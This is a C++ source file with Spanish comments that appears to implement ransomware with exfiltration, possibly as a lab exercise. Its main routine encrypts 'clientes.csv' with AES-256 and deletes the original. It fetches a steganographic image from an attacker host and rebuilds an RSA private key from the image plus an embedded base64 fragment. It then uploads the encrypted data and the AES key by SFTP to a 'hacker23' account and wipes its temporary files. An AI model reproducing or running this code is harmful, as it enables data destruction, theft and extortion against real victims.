
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <curl/curl.h>
#include <vector>
#include <fstream>
#include <stdexcept>
#include <iostream>
#include <cstring>
#include <string>
#include <cstdio>
#include <sstream>
#include <libssh2.h>
#include <libssh2_sftp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>

#include "openstego.h" // generado con xxd -i

std::vector<unsigned char> generateAES256Key(bool save2file = false, const std::string& filename = "aes256.key") {
    const int KEY_SIZE = 32; // 256 bits
    std::vector<unsigned char> key(KEY_SIZE);

    // Generar clave aleatoria segura
    if (RAND_bytes(key.data(), KEY_SIZE) != 1) {
        throw std::runtime_error("Error al generar la clave AES256 con OpenSSL");
    }

    // Guardar en archivo si se solicita
    if (save2file) {
        std::ofstream out(filename, std::ios::binary);
        if (!out) {
            throw std::runtime_error("No se pudo abrir el archivo para guardar la clave");
        }
        out.write(reinterpret_cast<const char*>(key.data()), key.size());
        out.close();
    }

    return key;
}

bool encryptFileAES256(
    const std::string& inputFile,
    const std::string& outputFile,
    const std::vector<unsigned char>& key) {

    if (key.size() != 32) {
        throw std::runtime_error("La clave debe tener 32 bytes (AES-256).");
    }

    // Generar IV (vector de inicialización)
    std::vector<unsigned char> iv(16);
    if (RAND_bytes(iv.data(), iv.size()) != 1) {
        throw std::runtime_error("Error al generar el IV.");
    }

    // Abrir archivos
    std::ifstream in(inputFile, std::ios::binary);
    if (!in) throw std::runtime_error("No se pudo abrir el archivo de entrada.");

    std::ofstream out(outputFile, std::ios::binary);
    if (!out) throw std::runtime_error("No se pudo crear el archivo de salida.");

    // Escribir el IV al inicio del archivo cifrado
    out.write(reinterpret_cast<const char*>(iv.data()), iv.size());

    // Crear contexto
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) throw std::runtime_error("Error al crear el contexto OpenSSL.");

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key.data(), iv.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Error al inicializar el cifrado AES-256-CBC.");
    }

    const size_t BUFFER_SIZE = 4096;
    std::vector<unsigned char> buffer(BUFFER_SIZE);
    std::vector<unsigned char> outBuffer(BUFFER_SIZE + EVP_CIPHER_block_size(EVP_aes_256_cbc()));

    int outLen;

    while (in.good()) {
        in.read(reinterpret_cast<char*>(buffer.data()), buffer.size());
        std::streamsize bytesRead = in.gcount();

        if (EVP_EncryptUpdate(ctx, outBuffer.data(), &outLen, buffer.data(), static_cast<int>(bytesRead)) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("Error durante el cifrado.");
        }

        out.write(reinterpret_cast<char*>(outBuffer.data()), outLen);
    }

    if (EVP_EncryptFinal_ex(ctx, outBuffer.data(), &outLen) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Error al finalizar el cifrado.");
    }

    out.write(reinterpret_cast<char*>(outBuffer.data()), outLen);

    EVP_CIPHER_CTX_free(ctx);
    return true;
}

static size_t write_data(void* ptr, size_t size, size_t nmemb, void* userdata) {
    FILE* stream = static_cast<FILE*>(userdata);
    if (!stream) return 0;
    return fwrite(ptr, size, nmemb, stream);
}

bool downloadImage(const std::string& ip,
                   int port,
                   const std::string& ruta,
                   const std::string& outputFilename)
{
    std::string path = ruta;
    if (path.empty()) path = "/";
    if (path.front() != '/') path.insert(path.begin(), '/');

    std::string url = "http://" + ip + ":" + std::to_string(port) + path;
    std::cout << "URL final: " << url << std::endl;

    CURL* curl = nullptr;
    FILE* fp = nullptr;
    CURLcode res;
    bool ok = false;

    // Inicializar libcurl globalmente
    if (curl_global_init(CURL_GLOBAL_DEFAULT) != 0) {
        std::cerr << "curl_global_init falló\n";
        return false;
    }

    curl = curl_easy_init();
    if (!curl) {
        std::cerr << "curl_easy_init falló\n";
        curl_global_cleanup();
        return false;
    }

    fp = std::fopen(outputFilename.c_str(), "wb");
    if (!fp) {
        std::cerr << "No se pudo abrir el archivo de salida: " << outputFilename << "\n";
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        return false;
    }

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L); // depuración

    res = curl_easy_perform(curl);

    if (res == CURLE_OK) {
        long code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
        std::cout << "HTTP code: " << code << std::endl;
        if (code == 200) ok = true;
    } else {
        std::cerr << "Error CURL: " << curl_easy_strerror(res) << std::endl;
    }

    std::fclose(fp);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    if (!ok) {
        std::remove(outputFilename.c_str());
    }

    return ok;
}


// Crea el archivo temporal del jar embebido y devuelve su ruta
std::string writeEmbeddedJar()
{
    std::string tempPath = "/tmp/openstego_embedded.jar";

    std::ofstream out(tempPath, std::ios::binary);
    if (!out)
        throw std::runtime_error("No se pudo crear el archivo temporal del jar.");

    out.write(reinterpret_cast<const char*>(openstego_jar), openstego_jar_len);
    out.close();

    return tempPath;
}

// Ejecuta OpenStego embebido para extraer datos de una imagen
bool extractWithEmbeddedOpenStego(const std::string& imagePath,
                                  const std::string& outputDir,
                                  const std::string& password = "")
{
    try {
        // 1. Crear el jar temporal
        std::string jarPath = writeEmbeddedJar();

        // 2. Construir el comando
        std::string cmd = "java -jar \"" + jarPath +
                          "\" extract -sf \"" + imagePath + "\""
                          //+ "\" -xd \"" + outputDir + "\""
                          ;

        if (!password.empty())
            cmd += " -p \"" + password + "\"";

        std::cout << "🔹 Ejecutando: " << cmd << std::endl;

        // 3. Ejecutar el comando
        int result = std::system(cmd.c_str());

        // 4. Eliminar el jar temporal
        std::remove(jarPath.c_str());

        return (result == 0);
    }
    catch (const std::exception& e) {
        std::cerr << "❌ Error: " << e.what() << std::endl;
        return false;
    }
}

// Lee el contenido completo de un archivo de texto
std::string readTextFile(const std::string& path) {
    std::ifstream file(path);
    if (!file.is_open()) {
        throw std::runtime_error("No se pudo abrir el archivo: " + path);
    }

    std::ostringstream ss;
    ss << file.rdbuf();
    return ss.str();
}

// Concatena el contenido del archivo con otro string
std::string concatFileWithString(const std::string& filePath, const std::string& text) {
    std::string fileContent = readTextFile(filePath);
    if (!fileContent.empty() && fileContent.back() == '\n')
    fileContent.pop_back();
    return text + fileContent; // puedes cambiar el orden si quieres text + fileContent
}

void SaveToFile(const std::string& content, std::string debugPath) {
    std::ofstream file(debugPath);
    if (!file.is_open()) {
        std::cerr << "No se pudo escribir el archivo de debug: " << debugPath << std::endl;
        return;
    }
    file << content;
    file.close();
    std::cout << "Debug guardado en: " << debugPath << std::endl;
}

// Decodificar Base64 a texto ===
std::string base64DecodeToText(const std::string& b64data) {
    BIO *bio, *b64;
    int decodeLen = b64data.size();
    std::string decoded;
    decoded.resize(decodeLen); // espacio máximo

    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new_mem_buf(b64data.data(), static_cast<int>(b64data.size()));
    bio = BIO_push(b64, bio);

    // evitar saltos de línea interpretados por BIO_f_base64
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);

    int len = BIO_read(bio, decoded.data(), decodeLen);
    if (len < 0)
        len = 0;

    decoded.resize(len);
    BIO_free_all(bio);

    return decoded;
}

// === Función principal para subir archivo por SFTP usando clave privada ===
bool uploadFileSFTP(const std::string& host,
                               int port,
                               const std::string& user,
                               const std::string& privateKeyPath,
                               const std::string& publicKeyPath,
                               const std::string& passphrase,
                               const std::string& localPath,
                               const std::string& remotePath)
{
    int sock;
    struct sockaddr_in sin{};
    struct hostent *hostinfo;
    LIBSSH2_SESSION *session = nullptr;
    LIBSSH2_SFTP *sftp_session = nullptr;
    LIBSSH2_SFTP_HANDLE *sftp_handle = nullptr;

    // === Inicializar libssh2 ===
    if (libssh2_init(0) != 0) {
        std::cerr << "Error: no se pudo inicializar libssh2" << std::endl;
        return false;
    }

    // === Resolver el host ===
    hostinfo = gethostbyname(host.c_str());
    if (!hostinfo) {
        std::cerr << "Error: no se pudo resolver el host" << std::endl;
        libssh2_exit();
        return false;
    }

    // === Crear y conectar socket ===
    sock = socket(AF_INET, SOCK_STREAM, 0);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr = *(struct in_addr*) hostinfo->h_addr;

    if (connect(sock, (struct sockaddr*)(&sin), sizeof(sin)) != 0) {
        std::cerr << "Error: no se pudo conectar al servidor" << std::endl;
        close(sock);
        libssh2_exit();
        return false;
    }

    // === Crear sesión SSH ===
    session = libssh2_session_init();
    if (!session) {
        std::cerr << "Error al crear sesión SSH" << std::endl;
        close(sock);
        libssh2_exit();
        return false;
    }

    if (libssh2_session_handshake(session, sock)) {
        std::cerr << "Falló el handshake SSH" << std::endl;
        libssh2_session_free(session);
        close(sock);
        libssh2_exit();
        return false;
    }

    // === Autenticación con clave privada ===
    int rc = libssh2_userauth_publickey_fromfile_ex(
        session,
        user.c_str(),
        static_cast<unsigned int>(user.length()),
        publicKeyPath.empty() ? nullptr : publicKeyPath.c_str(),
        privateKeyPath.c_str(),
        passphrase.empty() ? nullptr : passphrase.c_str()
    );

    if (rc != 0) {
        std::cerr << "Error de autenticación con clave privada" << std::endl;
        libssh2_session_disconnect(session, "Bye");
        libssh2_session_free(session);
        close(sock);
        libssh2_exit();
        return false;
    }

    std::cout << "Autenticación exitosa con clave privada\n";

    // === Crear sesión SFTP ===
    sftp_session = libssh2_sftp_init(session);
    if (!sftp_session) {
        std::cerr << "No se pudo iniciar sesión SFTP" << std::endl;
        libssh2_session_disconnect(session, "Bye");
        libssh2_session_free(session);
        close(sock);
        libssh2_exit();
        return false;
    }

    // === Abrir archivo remoto en modo escritura ===
    sftp_handle = libssh2_sftp_open(sftp_session, remotePath.c_str(),
                                    LIBSSH2_FXF_WRITE | LIBSSH2_FXF_CREAT | LIBSSH2_FXF_TRUNC,
                                    S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);

    if (!sftp_handle) {
        std::cerr << "No se pudo abrir archivo remoto: " << remotePath << std::endl;
        libssh2_sftp_shutdown(sftp_session);
        libssh2_session_disconnect(session, "Bye");
        libssh2_session_free(session);
        close(sock);
        libssh2_exit();
        return false;
    }

    // === Leer archivo local y enviarlo ===
    std::ifstream file(localPath, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "No se pudo abrir archivo local: " << localPath << std::endl;
        libssh2_sftp_close(sftp_handle);
        libssh2_sftp_shutdown(sftp_session);
        libssh2_session_disconnect(session, "Bye");
        libssh2_session_free(session);
        close(sock);
        libssh2_exit();
        return false;
    }

    char buffer[4096];
    while (file.good()) {
        file.read(buffer, sizeof(buffer));
        std::streamsize bytesRead = file.gcount();
        if (bytesRead > 0) {
            ssize_t bytesWritten = libssh2_sftp_write(sftp_handle, buffer, bytesRead);
            if (bytesWritten < 0) {
                std::cerr << "Error al escribir en el archivo remoto" << std::endl;
                break;
            }
        }
    }

    file.close();
    libssh2_sftp_close(sftp_handle);
    libssh2_sftp_shutdown(sftp_session);
    libssh2_session_disconnect(session, "Bye");
    libssh2_session_free(session);
    close(sock);
    libssh2_exit();

    std::cout << "Archivo subido correctamente a " << remotePath << std::endl;
    return true;
}

std::string base64Encode(const unsigned char* data, size_t len) {
    BIO* bio = BIO_new(BIO_s_mem());
    BIO* b64 = BIO_new(BIO_f_base64());
    BIO_push(b64, bio);
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO_write(b64, data, len);
    BIO_flush(b64);
    BUF_MEM* bufferPtr;
    BIO_get_mem_ptr(b64, &bufferPtr);
    std::string encoded(bufferPtr->data, bufferPtr->length);
    BIO_free_all(b64);
    return encoded;
}

// Genera la clave pública a partir de una clave privada usando ssh-keygen
std::string genPubKey(const std::string& privateKeyPath, const std::string& publicKeyPath)
{
    if (chmod(privateKeyPath.c_str(), 0600) != 0) {
        perror("Error al cambiar permisos del archivo de clave privada");
    }

    std::cout << "Permisos de " << privateKeyPath << " cambiados a 600." << std::endl;

    // Comando ssh-keygen -y -f private.pem > public.pub
    std::string command = "ssh-keygen -y -f " + privateKeyPath + " > " + publicKeyPath + " 2>/dev/null";

    int result = std::system(command.c_str());
    if (result != 0) {
        std::cerr << "Error: ssh-keygen fallo al generar la clave pública." << std::endl;
    }

    // Verificamos que se haya generado correctamente
    std::ifstream pubFile(publicKeyPath);
    if (!pubFile.is_open()) {
        std::cerr << "Error: no se pudo abrir el archivo de clave pública." << std::endl;
    }

    std::string pubKey((std::istreambuf_iterator<char>(pubFile)), std::istreambuf_iterator<char>());
    pubFile.close();

    if (pubKey.empty()) {
        std::cerr << "Error: la clave pública está vacía." << std::endl;
    }

    std::cout << "Clave pública generada correctamente en: " << publicKeyPath << std::endl;
    return publicKeyPath;
}

int main() {

    // Declaracion de constantes
    const std::string target = "clientes.csv";
    const std::string xaa = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlDWGdJQkFBS0JnUUROaXdwT2R6Q2oxZk1pMVJBVTNwNlF0MVZObXd1YWY5UkE1RFk3U2x0UVk2U1ZVOWg1CnRRSDlwVnVUb2t3eGNRWXNYYkNlTWJLcHN0RkVYYytlc25rN2p3cjU5SU9wZjlCamorYU51aGJEVUlIUDFuRjAKeUVqK0pYMVVlQ0NJdjZKOC8zNGtJUyt0WlVUSUJNd3dpU1o5VzZhMG5DWUZQQ3VRTjVYYmJHai9Vd0lEQVFBQgpBb0dCQU1RODNTZ3c3NFZjUFBlaWgrb0U2VXF0WG9uclgxYXdlSXREMXVzZ2dMSHRrRExwakNJV3lNSEwzL1RCCjNSRFBJZCsxeTJ3ZGNzQkY4em5jZnQ2NjhyWk55UXE5ZUhocExtdjgvREZzZTVDL3NvblozeC9ndENvTTlYRUYKQTlnT0dVdWh0V0xRZm5NV2k1VnFHQnpNa3RxMEJBY1FBNlpVNzJ5VUorOG1SNkJSQWtFQThIaWNpTVl0amN2KwpXR1ZUaHZzUDN2YWRScEg5ck9UWlVYYn";
    const std::string rhost = "192.168.81.138";
    const int rport_web = 8000;

    // Cifrar archivo
    std::vector<unsigned char> key = generateAES256Key(true);
    encryptFileAES256(target, target + ".encrypt", key);
    std::remove(target.c_str());

    // Obtener imagen
    downloadImage(rhost, rport_web, "/gorila_oculto.png", "xab.png");

    // Obtener fragmento de la imagen
    extractWithEmbeddedOpenStego("xab.png", "xab");
    std::string Raw_RSA = concatFileWithString("xab", xaa);
    //debugSaveToFile(Raw_RSA, "debug_Raw_RSA");
    std::string RSA = base64DecodeToText(Raw_RSA);
    //debugSaveToFile(RSA, "debug_RSA");
    SaveToFile(RSA, "key");
    uploadFileSFTP(rhost, 22, "hacker23", "key", genPubKey("key", "key.pub"), "", target + ".encrypt", "/home/hacker23/hacked/data");
    uploadFileSFTP(rhost, 22, "hacker23", "key", genPubKey("key", "key.pub"), "", "aes256.key", "/home/hacker23/hacked/aes256.key");

    // Eliminar Archivos temporales
    std::remove("gorila_oculto.png");
    std::remove("xab.png");
    std::remove("xab");
    std::remove("key");
    std::remove("key.pub");
    std::remove("aes256.key");
}